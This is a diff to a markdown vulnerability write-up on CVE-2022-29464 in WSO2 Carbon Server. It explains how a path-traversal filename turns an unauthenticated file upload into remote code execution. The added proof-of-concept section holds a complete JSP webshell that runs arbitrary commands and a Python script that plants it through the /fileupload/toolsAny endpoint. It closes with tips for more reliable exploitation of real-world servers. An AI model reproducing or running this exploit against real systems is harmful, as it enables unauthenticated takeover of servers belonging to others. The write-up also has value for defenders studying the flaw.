@@ -140,11 +140,91 @@ And then it appened the `fileName` of our uploaded file to `serviceUploadDir` =>
 
 ex:
 ```bash
-serviceDir = '/tmp/extra/${time_mili}
+serviceUploadDir = '/tmp/extra/${time_mili}
 fileName = '../../../<any_folder>
 
 => uploadedFile = /tmp/extra/${time_mili}/../../../<any_folder>
 ```
 
+### 3. Escalate arbitrary write file to RCE 
+Now that we have Unauth Arbitrary write file, the next question popped up in our mind is how do we escalate this to RCE ?. To answer this question, we have to go back to what we know about the codebase and answer a few more questions:
+- What to write ?
+- Where to write ? 
+
+
+**What to write ?** 
+![image](https://user-images.githubusercontent.com/37280106/165253235-27df731e-740a-4795-9d90-587af21190f8.png)
+
+We know that our web application serves JSP files at `./repository/deployment/servers/...`  , so that means we can write a JSP webshell to `webapps/` folder to achieve RCE 
+
+**Where to write ?** 
+Now we need to find a folder to write to, that any user can access without any authentication needed to achieve maximum severity.
+
+This is easy, the common thinking process will be go in the codebase and find any folder that serves JSP files like `login.jsp`, `index.jsp` because those are the landing pages of a web application, here I choose `user-portal` folder
+
+The path to write to will be: `./repository/deployment/server/webapps/user-portal` 
+
+
 ## Proof-of-concept
+
+JSP webshell:
+```java
+<%@ page import="java.util.*,java.io.*"%>
+
+<html>
+<body>
+    <FORM METHOD="GET" NAME="myform" ACTION="">
+    <INPUT TYPE="text" NAME="cmd">
+    <INPUT TYPE="submit" VALUE="Send">
+    </FORM>
+    <pre>
+    <%
+        if (request.getParameter("cmd") != null ) {
+            out.println("Command: " + request.getParameter("cmd") + "<BR>");
+            Runtime rt = Runtime.getRuntime();
+            Process p = rt.exec(request.getParameter("cmd"));
+            OutputStream os = p.getOutputStream();
+            InputStream in = p.getInputStream();
+            DataInputStream dis = new DataInputStream(in);
+            String disr = dis.readLine();
+            while ( disr != null ) {
+                out.println(disr);
+                disr = dis.readLine();
+            }
+        }
+    %>
+    </pre>
+</body>
+</html> 
+```
+
+Python exploit script:
+
+```python
+from ast import arg
+import requests
+import argparse
+
+
+def main():
+    parser = argparse.ArgumentParser(description="WSO2 Carbon Server CVE-2022-29464")
+    parser.add_argument("-u", help="WSO2 Carbon Server URL", required=True)
+    args = parser.parse_args()
+    endpoint_url = args.u
+    jsp_file = open("./poc.jsp", "rb")
+    resp = requests.post(f"{endpoint_url}/fileupload/toolsAny", verify=False, files={"../../../../repository/deployment/server/webapps/user-portal/cmd.jsp": jsp_file.read()})
+    print (resp.status_code)
+    print (resp.content)
+    if resp.status_code == 200 and len(resp.content) > 0:
+        print (f"Successfully exploited, webshell is hosted: {endpoint_url}/user-portal/cmd.jsp")
+        exit(0)
+
+if "__main__" == __name__:
+    main()
+```
+
+*poc image* 
+![image](https://user-images.githubusercontent.com/37280106/165254034-408f2e03-cf80-41e2-9f8b-ed72f5332dd1.png)
+
+Later, after trying to exploit a few real-world application, I find out that `user-portal` endpoint is not always **accessible**, the more reliable way to exploit will be `authenticationendpoint`, if you want more certainty in your exploit payload, change the filename to : `../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp`
 
